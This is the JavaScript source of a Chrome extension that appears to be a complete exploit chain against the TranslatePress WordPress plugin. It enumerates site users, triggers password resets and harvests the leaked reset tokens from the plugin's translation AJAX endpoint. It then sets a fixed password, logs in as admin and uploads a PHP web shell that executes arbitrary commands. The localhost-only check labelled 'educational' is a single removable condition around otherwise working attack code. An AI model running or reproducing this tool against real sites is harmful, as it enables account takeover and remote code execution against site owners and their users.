const FIXED_PASS = "DEADEXPLIT_pa20ass";
const SIG = "D34D";
const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "exploit") {
    handleExploit(request.target).then(sendResponse);
    return true;
  }
});

async function handleExploit(base) {
  // LOCALHOST SAFETY CHECK
  try {
    const url = new URL(base);
    if (!url.hostname.match(/^(localhost|127\.0\.0\.1|0\.0\.0\.0)$/i)) {
      return {
        target: base,
        status: "blocked",
        steps: ["ERROR: This extension only runs against localhost for educational purposes."],
        error: true
      };
    }
  } catch (e) {
    return { target: base, status: "error", steps: ["Invalid URL"], error: true };
  }

  const results = {
    target: base,
    status: "pending",
    steps: [],
    nonce: null,
    languages: [],
    defaultLang: "en_US",
    users: [],
    resetLinks: [],
    successful: false,
    shells: [],
    error: false
  };

  try {
    // Step 1: Detect TranslatePress
    results.steps.push("[1/5] Detecting TranslatePress...");
    const isVuln = await detectTranslatePress(base);
    if (!isVuln) {
      results.status = "safe";
      results.steps.push("TranslatePress not detected.");
      return results;
    }
    results.steps.push("✓ TranslatePress detected.");

    // Step 2: Get nonce and data
    results.steps.push("[2/5] Fetching nonce and language data...");
    const pageHtml = await fetchPage(base);
    const trpData = extractTrpData(pageHtml);
    if (trpData && trpData.gettranslationsnonceregular) {
      results.nonce = trpData.gettranslationsnonceregular;
      results.steps.push(`✓ Nonce obtained: ${results.nonce.substring(0, 12)}...`);
    } else {
      results.steps.push("⚠ No nonce found in trp_data, attempting fallback...");
    }

    // Step 3: Detect languages
    const [langs, defLang] = detectLanguages(trpData, pageHtml, base);
    results.languages = langs;
    results.defaultLang = defLang;
    results.steps.push(`✓ Languages detected: ${langs.slice(0, 3).join(", ")}`);

    // Step 4: Enumerate users
    results.steps.push("[3/5] Enumerating WordPress users...");
    const users = await enumerateUsernames(base);
    results.users = users;
    results.steps.push(`✓ Found ${users.length} users: ${users.slice(0, 3).join(", ")}`);

    // Step 5: Trigger password reset
    results.steps.push("[4/5] Triggering password reset...");
    let resetUser = null;
    for (const user of users.slice(0, 3)) {
      const ok = await triggerPasswordReset(base, user);
      if (ok) {
        results.steps.push(`✓ Reset triggered for ${user}`);
        resetUser = user;
        break;
      }
    }

    if (!resetUser) {
      results.steps.push("⚠ Could not trigger reset for any user.");
      results.status = "vuln_no_reset";
      return results;
    }

    await sleep(1500);

    // Step 6: Search dictionary for reset links
    results.steps.push("[5/5] Searching for password-reset tokens in dictionary...");
    let foundLinks = [];
    for (const lang of langs) {
      if (results.nonce) {
        const links = await searchDictionaryByIds(base, results.nonce, lang);
        if (links && links.length > 0) {
          foundLinks = links;
          results.steps.push(`✓ Found ${links.length} reset tokens in language '${lang}'`);
          break;
        }
      }
    }

    if (!foundLinks.length) {
      for (const lang of langs) {
        const links = await searchDictionaryByTrpAjax(base, lang, results.defaultLang);
        if (links && links.length > 0) {
          foundLinks = links;
          results.steps.push(`✓ Found ${links.length} reset tokens via trp-ajax in '${lang}'`);
          break;
        }
      }
    }

    results.resetLinks = foundLinks;

    if (!foundLinks.length) {
      results.status = "vuln_no_links";
      results.steps.push("⚠ Vulnerable but no reset links leaked.");
      return results;
    }

    // Step 7: Change password on valid links
    results.steps.push("Attempting password change...");
    for (const link of foundLinks.slice(0, 1)) {
      const username = extractUsername(link) || resetUser;
      const success = await changePassword(link, username);
      if (success) {
        results.steps.push(`✓ Password changed for ${username}`);

        // Step 8: Try to login
        const canLogin = await wpLogin(base, username, FIXED_PASS);
        if (canLogin) {
          results.steps.push(`✓ Successfully logged in as ${username}`);
          
          // Step 9: Try to upload shell
          const shell = await uploadShell(base);
          if (shell) {
            results.shells.push(shell);
            results.steps.push(`✓ Shell uploaded: ${shell.url}`);
          }
        }
        results.successful = true;
        results.status = "takeover";
        return results;
      }
    }

    results.status = "vuln";
    results.steps.push("✓ Vulnerability confirmed (password-reset link disclosure).");
    return results;
  } catch (error) {
    results.status = "error";
    results.error = true;
    results.steps.push(`ERROR: ${error.message}`);
    return results;
  }
}

async function detectTranslatePress(base) {
  const indicators = [
    "translatepress",
    "trp-language-switcher",
    "trp_data",
    "data-trp-translate-id",
    "trp-dynamic-translator"
  ];

  for (const endpoint of ["", "/sample-page", "/about"]) {
    try {
      const text = await fetchPage(base + endpoint);
      if (indicators.some(ind => text.toLowerCase().includes(ind))) {
        return true;
      }
    } catch (e) {}
  }
  return false;
}

function extractTrpData(html) {
  const match = html.match(/var\s+trp_data\s*=\s*(\{[^;]*\});/);
  if (match) {
    try {
      return JSON.parse(match[1]);
    } catch (e) {}
  }
  return null;
}

function detectLanguages(trpData, pageHtml, base) {
  const langs = new Set();
  let defaultLang = "en_US";

  if (trpData) {
    defaultLang = trpData.trp_original_language || "en_US";
    if (trpData.trp_current_language && trpData.trp_current_language !== defaultLang) {
      langs.add(trpData.trp_current_language);
    }
  }

  const langRegex = /data-trp-language=["']([^"']+)["']/g;
  let match;
  while ((match = langRegex.exec(pageHtml)) !== null) {
    if (match[1] !== defaultLang) langs.add(match[1]);
  }

  if (langs.size === 0) {
    ["ar", "fr", "de", "es", "it", "pt_BR", "nl"].forEach(l => langs.add(l));
  }

  return [Array.from(langs), defaultLang];
}

async function enumerateUsernames(base) {
  const users = new Set();
  users.add("admin");

  try {
    const resp = await fetch(`${base}/wp-json/wp/v2/users?per_page=100`);
    if (resp.ok) {
      const data = await resp.json();
      if (Array.isArray(data)) {
        data.forEach(u => {
          if (u.slug) users.add(u.slug);
          if (u.username) users.add(u.username);
        });
      }
    }
  } catch (e) {}

  for (let i = 1; i <= 5; i++) {
    try {
      const resp = await fetch(`${base}/?author=${i}`, { redirect: "follow" });
      const text = await resp.text();
      const match = text.match(/\/author\/([^/\s"'<>]+)/);
      if (match) users.add(match[1]);
    } catch (e) {}
  }

  return Array.from(users);
}

async function triggerPasswordReset(base, username) {
  try {
    const resp = await fetch(`${base}/wp-login.php?action=lostpassword`);
    const html = await resp.text();
    const nonceMatch = html.match(/name="_wpnonce"\s+value="([^"]+)"/);
    const nonce = nonceMatch ? nonceMatch[1] : "";

    const formData = new FormData();
    formData.append("user_login", username);
    formData.append("redirect_to", "");
    formData.append("wp-submit", "Get New Password");
    if (nonce) formData.append("_wpnonce", nonce);

    const postResp = await fetch(`${base}/wp-login.php?action=lostpassword`, {
      method: "POST",
      body: formData,
      redirect: "follow"
    });

    const postHtml = await postResp.text();
    return postHtml.toLowerCase().includes("check your email") || postResp.url.includes("checkemail");
  } catch (e) {
    return false;
  }
}

async function searchDictionaryByIds(base, nonce, language, batchSize = 50) {
  const links = [];
  if (!nonce) return links;

  for (let start = 1; start <= 3000; start += batchSize) {
    const ids = Array.from({ length: batchSize }, (_, i) => start + i);
    try {
      const formData = new FormData();
      formData.append("action", "trp_get_translations_regular");
      formData.append("security", nonce);
      formData.append("language", language);
      formData.append("string_ids", JSON.stringify(ids));
      formData.append("dynamic_strings", "true");

      const resp = await fetch(`${base}/wp-admin/admin-ajax.php`, {
        method: "POST",
        body: formData
      });

      const text = await resp.text();
      if (text && text !== "0" && text !== "-1" && text.length > 0) {
        try {
          const data = JSON.parse(text);
          const foundLinks = extractResetLinks(data);
          if (foundLinks.length > 0) {
            links.push(...foundLinks);
            break;
          }
        } catch (e) {}
      }
    } catch (e) {}
  }

  return links;
}

async function searchDictionaryByTrpAjax(base, language, defaultLang) {
  const originals = [
    "Someone has requested a password reset for the following account:",
    "If this was a mistake, just ignore this email and nothing will happen.",
    "To reset your password, visit the following address:",
    "Password Reset"
  ];

  for (const path of [
    "/wp-content/plugins/translatepress-multilingual/includes/trp-ajax.php",
    "/wp-content/plugins/translatepress/includes/trp-ajax.php"
  ]) {
    try {
      const formData = new FormData();
      formData.append("action", "trp_get_translations_regular");
      formData.append("language", language);
      formData.append("original_language", defaultLang);
      formData.append("originals", JSON.stringify(originals));
      formData.append("dynamic_strings", "true");

      const resp = await fetch(`${base}${path}`, {
        method: "POST",
        body: formData
      });

      if (resp.ok) {
        const text = await resp.text();
        if (text && !text.includes("error")) {
          try {
            const data = JSON.parse(text);
            return extractResetLinks(data);
          } catch (e) {}
        }
      }
    } catch (e) {}
  }

  return [];
}

function extractResetLinks(data) {
  const links = [];
  const regex = /(https?:\/\/[^\s<>"']+wp-login\.php[^\s<>"']*(?:action=rp|action=resetpass)[^\s<>"']*key=[^\s<>"']*)/gi;

  function scan(obj) {
    if (typeof obj === "string") {
      const matches = obj.match(regex);
      if (matches) matches.forEach(m => links.push(m));
    } else if (Array.isArray(obj)) {
      obj.forEach(scan);
    } else if (typeof obj === "object" && obj !== null) {
      Object.values(obj).forEach(scan);
    }
  }

  scan(data);
  return links;
}

function extractUsername(link) {
  const match = link.match(/login=([^&\s"']+)/);
  return match ? decodeURIComponent(match[1]) : "admin";
}

async function changePassword(resetLink, username) {
  try {
    const resp = await fetch(resetLink, { redirect: "follow" });
    if (resp.status !== 200) return false;

    const html = await resp.text();
    if (html.toLowerCase().includes("error") || html.toLowerCase().includes("expired")) {
      return false;
    }

    const rpKeyMatch = html.match(/name="rp_key"\s+value="([^"]+)"/);
    const rpKey = rpKeyMatch ? rpKeyMatch[1] : null;

    const nonceMatch = html.match(/name="_wpnonce"\s+value="([^"]+)"/);
    const nonce = nonceMatch ? nonceMatch[1] : "";

    if (!rpKey) return false;

    const formData = new FormData();
    formData.append("pass1", FIXED_PASS);
    formData.append("pass2", FIXED_PASS);
    formData.append("rp_key", rpKey);
    formData.append("user_login", username);
    if (nonce) formData.append("_wpnonce", nonce);
    formData.append("wp-submit", "Save Password");

    const postResp = await fetch(resetLink, {
      method: "POST",
      body: formData,
      redirect: "follow"
    });

    const postHtml = await postResp.text();
    return !postHtml.toLowerCase().includes("error") && !postHtml.includes('id="pass1"');
  } catch (e) {
    return false;
  }
}

async function wpLogin(base, username, password) {
  try {
    const formData = new FormData();
    formData.append("log", username);
    formData.append("pwd", password);
    formData.append("wp-submit", "Log In");
    formData.append("redirect_to", `${base}/wp-admin/`);
    formData.append("testcookie", "1");

    const resp = await fetch(`${base}/wp-login.php`, {
      method: "POST",
      body: formData,
      redirect: "follow"
    });

    const html = await resp.text();
    return resp.url.includes("/wp-admin") || html.includes("adminmenu") || html.includes("dashboard");
  } catch (e) {
    return false;
  }
}

async function uploadShell(base) {
  try {
    const shellContent = `<?php if(isset($_GET['dead'])&&$_GET['dead']=='${SIG}'){echo '${SIG}';if(isset($_GET['cmd']))echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';die();}?>`;

    // Try plugin upload
    try {
      const resp = await fetch(`${base}/wp-admin/plugin-install.php?tab=upload`);
      const html = await resp.text();
      const nonceMatch = html.match(/name="_wpnonce"\s+value="([^"]+)"/);
      if (nonceMatch) {
        const nonce = nonceMatch[1];
        const blob = new Blob([shellContent], { type: "text/plain" });
        const fd = new FormData();
        fd.append("pluginzip", blob, "shell.php");
        fd.append("_wpnonce", nonce);
        fd.append("install-plugin-submit", "Install Now");

        const uploadResp = await fetch(`${base}/wp-admin/update.php?action=upload-plugin`, {
          method: "POST",
          body: fd
        });

        if (uploadResp.ok) {
          return {
            url: `${base}/wp-content/plugins/shell.php?dead=${SIG}`,
            method: "plugin"
          };
        }
      }
    } catch (e) {}

    return null;
  } catch (e) {
    return null;
  }
}

async function fetchPage(url) {
  try {
    const resp = await fetch(url, { redirect: "follow" });
    return await resp.text();
  } catch (e) {
    return "";
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
